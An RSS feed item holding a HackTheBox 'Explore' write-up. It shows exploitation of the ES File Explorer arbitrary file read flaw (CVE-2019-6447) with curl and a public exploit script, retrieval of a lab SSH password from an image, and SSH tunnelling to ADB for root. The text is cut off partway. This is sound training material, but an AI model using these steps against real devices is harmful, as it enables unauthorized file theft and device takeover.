<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Android on Ef&#39;s log</title>
    <link>https://fahmifj.github.io/tags/android/</link>
    <description>Recent content in Android on Ef&#39;s log</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Sat, 30 Oct 2021 17:36:39 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/android/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>HackTheBox - Explore</title>
      <link>https://fahmifj.github.io/hackthebox/explore/</link>
      <pubDate>Sat, 30 Oct 2021 17:36:39 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/hackthebox/explore/</guid>
      <description>Exploiting ES File Explorer and abusing ADB</description>
      <content:encoded><![CDATA[<p>Explore features an ES File Explorer that is vulnerable to Arbitrary File Read, allowing me to obtain a picture containing SSH credentials. Enumerating the system reveals that the machine has debug mode enabled and ADB daemon running, these two can then be leveraged to obtain root access via ADB client.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>Exploiting ES File Explorer vulnerability</li>
<li>Android enumeration and exploitation</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li>Adb</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p><code>Nmap</code> scan on TCP ports discovers 5 open ports:</p>
<ul>
<li>SSH on port 2222</li>
<li>For port 5555, nmap identifies it as freeciv, but judging based on the OS, this can be ADB<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup>.</li>
<li>The rest 37817, 42135, and 59777 are HTTP servers.</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «explore» «10.10.14.32» 
</span></span><span class="line"><span class="cl">$ nmap -p- --min-rate <span class="m">1000</span> --reason -oA nmap/all-tcp-explorer 10.10.10.247
</span></span><span class="line"><span class="cl">Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-06-27 17:39 EDT
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.10.247
</span></span><span class="line"><span class="cl">Host is up, received reset ttl <span class="m">63</span> <span class="o">(</span>0.057s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">Not shown: <span class="m">65530</span> closed ports
</span></span><span class="line"><span class="cl">Reason: <span class="m">65530</span> resets
</span></span><span class="line"><span class="cl">PORT      STATE    SERVICE      REASON
</span></span><span class="line"><span class="cl">2222/tcp  open     EtherNetIP-1 syn-ack ttl <span class="m">63</span>
</span></span><span class="line"><span class="cl">5555/tcp  filtered freeciv      no-response
</span></span><span class="line"><span class="cl">37817/tcp open     unknown      syn-ack ttl <span class="m">63</span>
</span></span><span class="line"><span class="cl">42135/tcp open     unknown      syn-ack ttl <span class="m">63</span>
</span></span><span class="line"><span class="cl">59777/tcp open     unknown      syn-ack ttl <span class="m">63</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 38.81 seconds
</span></span><span class="line"><span class="cl">→ root@kali «explore» «10.10.14.32» 
</span></span><span class="line"><span class="cl">$ nmap -p2222,5555,37817,42135,59777 -sC -sV -oA nmap/all-tcp-script-explorer 10.10.10.247         
</span></span><span class="line"><span class="cl">Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-06-27 17:47 EDT
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.10.247
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.051s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT      STATE    SERVICE VERSION
</span></span><span class="line"><span class="cl">2222/tcp  open     ssh     <span class="o">(</span>protocol 2.0<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> fingerprint-strings: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   NULL: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_    SSH-2.0-SSH Server - Banana Studio
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">2048</span> 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb <span class="o">(</span>RSA<span class="o">)</span>
</span></span><span class="line"><span class="cl">5555/tcp  filtered freeciv
</span></span><span class="line"><span class="cl">37817/tcp open     unknown
</span></span><span class="line"><span class="cl"><span class="p">|</span> fingerprint-strings: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   GenericLines: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>     HTTP/1.0 <span class="m">400</span> Bad Request
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Date: Sun, <span class="m">27</span> Jun <span class="m">2021</span> 21:47:36 GMT
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Length: <span class="m">22</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Type: text/plain<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>US-ASCII
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Connection: Close
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Invalid request line:
</span></span><span class="line"><span class="cl"><span class="p">|</span>   GetRequest: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>     HTTP/1.1 <span class="m">412</span> Precondition Failed
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Date: Sun, <span class="m">27</span> Jun <span class="m">2021</span> 21:47:36 GMT
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Length: <span class="m">0</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>   HTTPOptions: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>     HTTP/1.0 <span class="m">501</span> Not Implemented
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Date: Sun, <span class="m">27</span> Jun <span class="m">2021</span> 21:47:41 GMT
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Length: <span class="m">29</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Type: text/plain<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>US-ASCII
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Connection: Close
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Method not supported: OPTIONS
</span></span><span class="line"><span class="cl"><span class="p">|</span>   Help: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>     HTTP/1.0 <span class="m">400</span> Bad Request
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Date: Sun, <span class="m">27</span> Jun <span class="m">2021</span> 21:47:57 GMT
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Length: <span class="m">26</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Type: text/plain<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>US-ASCII
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Connection: Close
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Invalid request line: HELP
</span></span><span class="line"><span class="cl"><span class="p">|</span>   RTSPRequest: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>     HTTP/1.0 <span class="m">400</span> Bad Request
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Date: Sun, <span class="m">27</span> Jun <span class="m">2021</span> 21:47:41 GMT
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Length: <span class="m">39</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Type: text/plain<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>US-ASCII
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Connection: Close
</span></span><span class="line"><span class="cl"><span class="p">|</span>     valid protocol version: RTSP/1.0
</span></span><span class="line"><span class="cl"><span class="p">|</span>   SSLSessionReq: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>     HTTP/1.0 <span class="m">400</span> Bad Request
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Date: Sun, <span class="m">27</span> Jun <span class="m">2021</span> 21:47:57 GMT
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Length: <span class="m">73</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Type: text/plain<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>US-ASCII
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Connection: Close
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Invalid request line: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>     ?G???,???<span class="sb">`</span>~?
</span></span><span class="line"><span class="cl"><span class="p">|</span>     ??<span class="o">{</span>????w????&lt;<span class="o">=</span>?o?
</span></span><span class="line"><span class="cl"><span class="p">|</span>   TLSSessionReq: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>     HTTP/1.0 <span class="m">400</span> Bad Request
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Date: Sun, <span class="m">27</span> Jun <span class="m">2021</span> 21:47:57 GMT
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Length: <span class="m">71</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Type: text/plain<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>US-ASCII
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Connection: Close
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Invalid request line: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>     ??random1random2random3random4
</span></span><span class="line"><span class="cl"><span class="p">|</span>   TerminalServerCookie: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>     HTTP/1.0 <span class="m">400</span> Bad Request
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Date: Sun, <span class="m">27</span> Jun <span class="m">2021</span> 21:47:57 GMT
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Length: <span class="m">54</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Type: text/plain<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>US-ASCII
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Connection: Close
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Invalid request line: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_    Cookie: <span class="nv">mstshash</span><span class="o">=</span>nmap
</span></span><span class="line"><span class="cl">42135/tcp open     http    ES File Explorer Name Response httpd
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Site doesn<span class="s1">&#39;t have a title (text/html).
</span></span></span><span class="line"><span class="cl"><span class="s1">59777/tcp open     http    Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older
</span></span></span><span class="line"><span class="cl"><span class="s1">|_http-title: Site doesn&#39;</span>t have a title <span class="o">(</span>text/plain<span class="o">)</span>.
</span></span><span class="line"><span class="cl"><span class="m">2</span> services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
</span></span><span class="line"><span class="cl"><span class="o">==============</span>NEXT SERVICE FINGERPRINT <span class="o">(</span>SUBMIT INDIVIDUALLY<span class="o">)==============</span>
</span></span><span class="line"><span class="cl">SF-Port2222-TCP:V<span class="o">=</span>7.80%I<span class="o">=</span>7%D<span class="o">=</span>6/27%Time<span class="o">=</span>60D8F1F8%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>NU
</span></span><span class="line"><span class="cl">SF:LL,24,<span class="s2">&#34;SSH-2\.0-SSH\x20Server\x20-\x20Banana\x20Studio\r\n&#34;</span><span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="o">==============</span>NEXT SERVICE FINGERPRINT <span class="o">(</span>SUBMIT INDIVIDUALLY<span class="o">)==============</span>
</span></span><span class="line"><span class="cl">SF-Port37817-TCP:V<span class="o">=</span>7.80%I<span class="o">=</span>7%D<span class="o">=</span>6/27%Time<span class="o">=</span>60D8F1F8%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>G
</span></span><span class="line"><span class="cl">SF:enericLines,AA,<span class="s2">&#34;HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Sun,\x20
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">...[SNIP]...
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">Service Info: Device: phone
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span></span><span class="line"><span class="cl"><span class="s2">Nmap done: 1 IP address (1 host up) scanned in 105.79 seconds
</span></span></span></code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-37817">TCP 37817</h3>
<p>No reply given from 37817, it showed in a close state when I tried to rescan it.</p>
<h3 id="tcp-59777--42135---es-file-explorer">TCP 59777 &amp; 42135 - ES File Explorer</h3>
<p>If I search for port 59777 and 42135 on Google, the results show that these ports are belong to ES File Explorer.</p>
<p>Interacting with port 59777 from the browser gives me the response below, and no further information given.</p>
<p><div class="img-container"><img src="imgs/image-20211030202819887.png" alt="image-20211030202819887"  /></div>
</p>
<p>If I use <code>nc</code>, port 59777 returns with a forbidden error message.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «explore» «10.10.14.83» 
</span></span><span class="line"><span class="cl">$ nc 10.10.10.247 <span class="m">59777</span>
</span></span><span class="line"><span class="cl">GET /
</span></span><span class="line"><span class="cl">HTTP/1.0 <span class="m">403</span> Forbidden 
</span></span><span class="line"><span class="cl">Content-Type: text/plain
</span></span><span class="line"><span class="cl">Date: Sun, <span class="m">9</span> Jul <span class="m">2021</span> 22:32:42 GMT
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">FORBIDDEN: No directory listing
</span></span></code></pre></div><p>For port 42135, interacting with it from <code>nc</code> or the browser both returns 404 not found message.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «explore» «10.10.14.83» 
</span></span><span class="line"><span class="cl">$ nc 10.10.10.247 <span class="m">42135</span>
</span></span><span class="line"><span class="cl">GET / HTTP/1.1
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">HTTP/1.1 <span class="m">404</span> Not Found
</span></span><span class="line"><span class="cl">Server: ES Name Response Server
</span></span><span class="line"><span class="cl">Content-Type: text/html
</span></span><span class="line"><span class="cl">Content-Length: <span class="m">9</span>
</span></span><span class="line"><span class="cl">Connection: close
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Not found
</span></span></code></pre></div><h4 id="finding-vulnerabilities">Finding Vulnerabilities</h4>
<p>On Exploit-DB, there is one recent exploit for ES File Explorer, which was released 3 days after this box. This looks promising,</p>
<p><div class="img-container"><img src="imgs/image-20210710054049723.png" alt="image-20210710054049723"  /></div>
</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-kristi">Shell as kristi</h3>
<h4 id="es-file-explorer-cve-2019-6447">ES File Explorer CVE-2019-6447</h4>
<p>The arbitrary file read vulnerability on ES File Explorer 4.1.9.7.4 is classified as CVE-2019-6447. <a href="https://medium.com/@knownsec404team/analysis-of-es-file-explorer-security-vulnerability-cve-2019-6447-7f34407ed566">This articles</a> explains about the vulnerability, but I will just quote its overview part which states that:</p>
<blockquote>
<p>The ES file browser creates an HTTP service bound to port 59777 at runtime, which provides 10+ commands for accessing data in user’s cell  phone and executing the application; however, the service does not check this request. Test, resulting in a security breach.</p>
</blockquote>
<p>I can test for the vulnerability by sending a HTTP POST request containing one of the available commands like <code>getDeviceInfo</code> to <code>http://10.10.10.247:59777</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «explore» «10.10.14.83» 
</span></span><span class="line"><span class="cl">$ curl -d <span class="s1">&#39;{&#34;command&#34;:&#34;getDeviceInfo&#34;}&#39;</span> http://10.10.10.247:59777   
</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;VMware Virtual Platform&#34;</span>, <span class="s2">&#34;ftpRoot&#34;</span>:<span class="s2">&#34;/sdcard&#34;</span>, <span class="s2">&#34;ftpPort&#34;</span>:<span class="s2">&#34;3721&#34;</span><span class="o">}</span>
</span></span></code></pre></div><p>And it was vulnerable!</p>
<p>This time I will grab this <a href="https://www.exploit-db.com/exploits/50070">exploit</a>. When sending <code>listPics</code>  command, it returns with one interesting file name called <code>creds.jpg</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.83» 
</span></span><span class="line"><span class="cl">$ python3 esfile_cve2019-6447.py listPics 10.10.10.247
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">==================================================================</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>    ES File Explorer Open Port Vulnerability : CVE-2019-6447    <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>                Coded By : Nehal a.k.a PwnerSec                 <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="o">==================================================================</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">name : concept.jpg
</span></span><span class="line"><span class="cl"><span class="nb">time</span> : 4/21/21 02:38:08 AM
</span></span><span class="line"><span class="cl">location : /storage/emulated/0/DCIM/concept.jpg
</span></span><span class="line"><span class="cl">size : 135.33 KB <span class="o">(</span>138,573 Bytes<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">name : anc.png
</span></span><span class="line"><span class="cl"><span class="nb">time</span> : 4/21/21 02:37:50 AM
</span></span><span class="line"><span class="cl">location : /storage/emulated/0/DCIM/anc.png
</span></span><span class="line"><span class="cl">size : 6.24 KB <span class="o">(</span>6,392 Bytes<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">name : creds.jpg
</span></span><span class="line"><span class="cl"><span class="nb">time</span> : 4/21/21 02:38:18 AM
</span></span><span class="line"><span class="cl">location : /storage/emulated/0/DCIM/creds.jpg
</span></span><span class="line"><span class="cl">size : 1.14 MB <span class="o">(</span>1,200,401 Bytes<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">name : 224_anc.png
</span></span><span class="line"><span class="cl"><span class="nb">time</span> : 4/21/21 02:37:21 AM
</span></span><span class="line"><span class="cl">location : /storage/emulated/0/DCIM/224_anc.png
</span></span><span class="line"><span class="cl">size : 124.88 KB <span class="o">(</span>127,876 Bytes<span class="o">)</span>
</span></span></code></pre></div><p>The file can be downloaded with <code>getFile</code> command and then supply the file path as the last argument.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.83» 
</span></span><span class="line"><span class="cl">$ python3 esfile_cve2019-6447.py getFile 10.10.10.247 /storage/emulated/0/DCIM/creds.jpg 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">==================================================================</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>    ES File Explorer Open Port Vulnerability : CVE-2019-6447    <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>                Coded By : Nehal a.k.a PwnerSec                 <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="o">==================================================================</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Downloading file...
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Done. Saved as <span class="sb">`</span>out.dat<span class="sb">`</span>.
</span></span></code></pre></div><p>The saved image contains a set of creds: <code>kristi:Kr1sT!5h@Rp3xPl0r3!</code></p>
<p><div class="img-container"><img src="imgs/image-20210710055249731.png" alt="image-20210710055249731"  /></div>
</p>
<h4 id="ssh---kristi">SSH - Kristi</h4>
<p>These credentials works on SSH.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.83» 
</span></span><span class="line"><span class="cl">$ ssh -p <span class="m">2222</span> kristi@10.10.10.247
</span></span><span class="line"><span class="cl">Password authentication
</span></span><span class="line"><span class="cl">Password: 
</span></span><span class="line"><span class="cl">:/ $ whoami <span class="o">&amp;&amp;</span> id <span class="o">&amp;&amp;</span> hostname
</span></span><span class="line"><span class="cl">u0_a76
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>10076<span class="o">(</span>u0_a76<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>10076<span class="o">(</span>u0_a76<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>10076<span class="o">(</span>u0_a76<span class="o">)</span>,3003<span class="o">(</span>inet<span class="o">)</span>,9997<span class="o">(</span>everybody<span class="o">)</span>,20076<span class="o">(</span>u0_a76_cache<span class="o">)</span>,50076<span class="o">(</span>all_a76<span class="o">)</span> <span class="nv">context</span><span class="o">=</span>u:r:untrusted_app:s0:c76,c256,c512,c768
</span></span><span class="line"><span class="cl">localhost
</span></span></code></pre></div><p>The username appeared as  <code>u0_a76</code> because each application on Android starting from OS 6.0+ is sandboxed. In this case the SSH server is a sandboxed application.</p>
<p>The user flag is on <code>/sdcard/user.txt</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">:/sdcard $ ls -la
</span></span><span class="line"><span class="cl">total <span class="m">68</span>
</span></span><span class="line"><span class="cl">drwxrwx--- <span class="m">15</span> root everybody <span class="m">4096</span> 2021-04-21 02:12 .
</span></span><span class="line"><span class="cl">drwx--x--x  <span class="m">4</span> root everybody <span class="m">4096</span> 2021-03-13 17:16 ..
</span></span><span class="line"><span class="cl">drwxrwx---  <span class="m">5</span> root everybody <span class="m">4096</span> 2021-03-13 17:30 .estrongs
</span></span><span class="line"><span class="cl">-rw-rw----  <span class="m">1</span> root everybody   <span class="m">72</span> 2021-07-09 07:16 .userReturn
</span></span><span class="line"><span class="cl">drwxrwx---  <span class="m">2</span> root everybody <span class="m">4096</span> 2021-03-13 17:16 Alarms
</span></span><span class="line"><span class="cl">drwxrwx---  <span class="m">3</span> root everybody <span class="m">4096</span> 2021-03-13 17:16 Android
</span></span><span class="line"><span class="cl">drwxrwx---  <span class="m">2</span> root everybody <span class="m">4096</span> 2021-04-21 02:38 DCIM
</span></span><span class="line"><span class="cl">drwxrwx---  <span class="m">2</span> root everybody <span class="m">4096</span> 2021-03-13 17:37 Download
</span></span><span class="line"><span class="cl">drwxrwx---  <span class="m">2</span> root everybody <span class="m">4096</span> 2021-03-13 17:16 Movies
</span></span><span class="line"><span class="cl">drwxrwx---  <span class="m">2</span> root everybody <span class="m">4096</span> 2021-03-13 17:16 Music
</span></span><span class="line"><span class="cl">drwxrwx---  <span class="m">2</span> root everybody <span class="m">4096</span> 2021-03-13 17:16 Notifications
</span></span><span class="line"><span class="cl">drwxrwx---  <span class="m">2</span> root everybody <span class="m">4096</span> 2021-03-13 17:16 Pictures
</span></span><span class="line"><span class="cl">drwxrwx---  <span class="m">2</span> root everybody <span class="m">4096</span> 2021-03-13 17:16 Podcasts
</span></span><span class="line"><span class="cl">drwxrwx---  <span class="m">2</span> root everybody <span class="m">4096</span> 2021-03-13 17:16 Ringtones
</span></span><span class="line"><span class="cl">drwxrwx---  <span class="m">3</span> root everybody <span class="m">4096</span> 2021-03-13 17:30 backups
</span></span><span class="line"><span class="cl">drwxrwx---  <span class="m">2</span> root everybody <span class="m">4096</span> 2021-04-21 02:12 dianxinos
</span></span><span class="line"><span class="cl">-rw-rw----  <span class="m">1</span> root everybody   <span class="m">33</span> 2021-03-13 18:28 user.txt
</span></span><span class="line"><span class="cl">:/sdcard $ cat user.txt
</span></span><span class="line"><span class="cl">f3201...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-root">Shell as root</h3>
<h4 id="adb">ADB</h4>
<p>While enumerating this machine, I found a <code>xbin</code> folder under <code>/system</code> directory.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">:/system $ ls -l
</span></span><span class="line"><span class="cl">total <span class="m">212</span>
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">41</span> root root    <span class="m">4096</span> 2020-03-25 00:26 app
</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">3</span> root shell   <span class="m">8192</span> 2020-03-25 00:26 bin
</span></span><span class="line"><span class="cl">-rw-------  <span class="m">1</span> root root    <span class="m">2824</span> 2020-03-24 23:39 build.prop
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">2</span> root shell   <span class="m">8192</span> 2020-03-25 00:26 xbin
</span></span></code></pre></div><p>When I was an active XDA member (2011~2013), the existence of <code>/system/xbin</code> or <code>/system/xbin/su</code>  indicated that the device was rooted back then (I just found out that this method<sup id="fnref:2"><a href="#fn:2" class="footnote-ref" role="doc-noteref">2</a></sup> is still used today).</p>
<p>Typically people who rooted their device has a debug mode enabled, therefore, I&rsquo;m guessing that the only way to gain a root shell from here is through <code>adb</code> (android debug bridge) on port 5555.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">:/ $ netstat -tlpn
</span></span><span class="line"><span class="cl">Active Internet connections <span class="o">(</span>only servers<span class="o">)</span>
</span></span><span class="line"><span class="cl">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program Name
</span></span><span class="line"><span class="cl">tcp        <span class="m">0</span>      <span class="m">1</span> 10.10.10.247:60138      1.0.0.1:853             SYN_SENT    -
</span></span><span class="line"><span class="cl">tcp        <span class="m">0</span>      <span class="m">1</span> 10.10.10.247:48216      1.1.1.1:853             SYN_SENT    -
</span></span><span class="line"><span class="cl">tcp6       <span class="m">0</span>      <span class="m">0</span> :::42135                :::*                    LISTEN      -
</span></span><span class="line"><span class="cl">tcp6       <span class="m">0</span>      <span class="m">0</span> :::59777                :::*                    LISTEN      -
</span></span><span class="line"><span class="cl">tcp6       <span class="m">0</span>      <span class="m">0</span> ::ffff:10.10.10.2:33035 :::*                    LISTEN      -
</span></span><span class="line"><span class="cl">tcp6       <span class="m">0</span>      <span class="m">0</span> :::2222                 :::*                    LISTEN      3405/net.xnano.android.sshserver
</span></span><span class="line"><span class="cl">tcp6       <span class="m">0</span>      <span class="m">0</span> ::ffff:127.0.0.1:38415  :::*                    LISTEN      -
</span></span><span class="line"><span class="cl">tcp6       <span class="m">0</span>      <span class="m">0</span> :::5555                 :::*                    LISTEN      -
</span></span><span class="line"><span class="cl">tcp6       <span class="m">0</span>      <span class="m">0</span> ::ffff:127.0.0.1:5555   ::ffff:127.0.0.1:56602  ESTABLISHED -
</span></span><span class="line"><span class="cl">tcp6       <span class="m">0</span>      <span class="m">0</span> ::ffff:127.0.0.1:56604  ::ffff:127.0.0.1:5555   ESTABLISHED 3405/net.xnano.android.sshserver
</span></span><span class="line"><span class="cl">tcp6       <span class="m">0</span>      <span class="m">0</span> ::ffff:127.0.0.1:5555   ::ffff:127.0.0.1:56604  ESTABLISHED -
</span></span><span class="line"><span class="cl">tcp6       <span class="m">0</span>    <span class="m">624</span> ::ffff:10.10.10.24:2222 ::ffff:10.10.14.2:55618 ESTABLISHED 3405/net.xnano.android.sshserver
</span></span><span class="line"><span class="cl">tcp6       <span class="m">0</span>      <span class="m">0</span> ::ffff:127.0.0.1:56602  ::ffff:127.0.0.1:5555   ESTABLISHED 3405/net.xnano.android.sshserver
</span></span><span class="line"><span class="cl">tcp6       <span class="m">0</span>      <span class="m">0</span> ::ffff:10.10.10.24:2222 ::ffff:10.10.14.2:55602 ESTABLISHED 3405/net.xnano.android.sshserver
</span></span></code></pre></div><p>As I only have ADB on my host device (Windows), I created two SSH tunnels: <code>Windows:5555 &lt;-SSH-&gt; Kali:5555 &lt;-SSH-&gt; Explorer:5555</code>.</p>
<p>On my Windows:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ ssh kali -L 5555:localhost:5555
</span></span></code></pre></div><p>On my Kali:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ ssh -p <span class="m">2222</span> kristi@10.10.10.247 -L 5555:localhost:5555
</span></span></code></pre></div><p>Back on my Windows, I will connect to the Explore ADB server which is now accessible over port 5555 on my localhost.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">explore › adb tcpip <span class="m">5555</span>
</span></span><span class="line"><span class="cl">* daemon not running<span class="p">;</span> starting now at tcp:5037
</span></span><span class="line"><span class="cl">* daemon started successfully
</span></span><span class="line"><span class="cl">restarting in TCP mode port: <span class="m">5555</span>
</span></span><span class="line"><span class="cl">explore › adb connect localhost:5555
</span></span><span class="line"><span class="cl">connected to localhost:5555
